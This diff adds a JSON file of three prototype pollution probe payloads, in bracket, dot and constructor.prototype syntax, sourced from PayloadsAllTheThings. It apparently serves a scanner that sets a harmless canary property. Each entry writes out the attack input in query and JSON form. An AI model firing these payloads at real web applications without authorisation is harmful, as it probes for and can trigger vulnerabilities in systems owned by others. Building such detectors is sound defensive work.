@@ -1,0 +1,32 @@
+[
+  {
+    "name": "proto_bracket_syntax",
+    "canary_property": "tc_canary_pp_probe",
+    "canary_value": "canary_val_active_probe",
+    "payload_query": "__proto__[tc_canary_pp_probe]=canary_val_active_probe",
+    "payload_json": "{\"__proto__\": {\"tc_canary_pp_probe\": \"canary_val_active_probe\"}}",
+    "kind": "bracket_notation",
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "Prototype Pollution/README.md"
+  },
+  {
+    "name": "proto_dot_syntax",
+    "canary_property": "tc_canary_pp_probe",
+    "canary_value": "canary_val_active_probe",
+    "payload_query": "__proto__.tc_canary_pp_probe=canary_val_active_probe",
+    "payload_json": "{\"__proto__.tc_canary_pp_probe\": \"canary_val_active_probe\"}",
+    "kind": "dot_notation",
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "Prototype Pollution/README.md"
+  },
+  {
+    "name": "constructor_prototype_syntax",
+    "canary_property": "tc_canary_pp_probe",
+    "canary_value": "canary_val_active_probe",
+    "payload_query": "constructor[prototype][tc_canary_pp_probe]=canary_val_active_probe",
+    "payload_json": "{\"constructor\": {\"prototype\": {\"tc_canary_pp_probe\": \"canary_val_active_probe\"}}}",
+    "kind": "constructor_prototype",
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "Prototype Pollution/README.md"
+  }
+]
